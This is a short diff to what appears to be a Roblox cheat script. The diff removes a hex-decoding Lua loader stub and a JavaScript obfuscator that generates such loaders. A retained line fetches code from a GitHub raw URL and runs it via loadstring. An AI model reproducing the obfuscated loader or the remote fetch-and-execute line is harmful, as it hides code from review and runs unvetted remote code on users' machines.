@@ -1,9 +1,4 @@
-local h = "깃허브에서_변환된_16진수_데이터가_이곳에_들어갑니다"
-local s = ""
-for i = 1, #h, 2 do
-    s = s .. string.char(tonumber(h:sub(i, i+1), 16))
-end
-assert(loadstring(s))()
+
 
 
 print("AP FTAP Script 시작 - 설정 저장 활성화")
@@ -13106,13 +13101,3 @@ BlacklistTab:CreateLabel("블랙리스트:kvzwx9  6월 27일 오후7시 39분 42
 loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/paca bot"))()
 Logger()
 
-function hexObfuscator(code) {
-    var cleanCode = code.replace(/\/\*[\s\S]*?\*\/|([^\\:]|^)\/\/.*$/gm, '$1').replace(/--.*$/gm, '');
-    var hexArr = [];
-    for (var i = 0; i < cleanCode.length; i++) {
-        var hex = cleanCode.charCodeAt(i).toString(16);
-        hexArr.push(hex.length === 1 ? '0' + hex : hex);
-    }
-    var hexStr = hexArr.join('');
-    return 'local h = "' + hexStr + '"\nlocal s = ""\nfor i = 1, #h, 2 do\n    s = s .. string.char(tonumber(h:sub(i, i+1), 16))\nend\nassert(loadstring(s))()';
-}
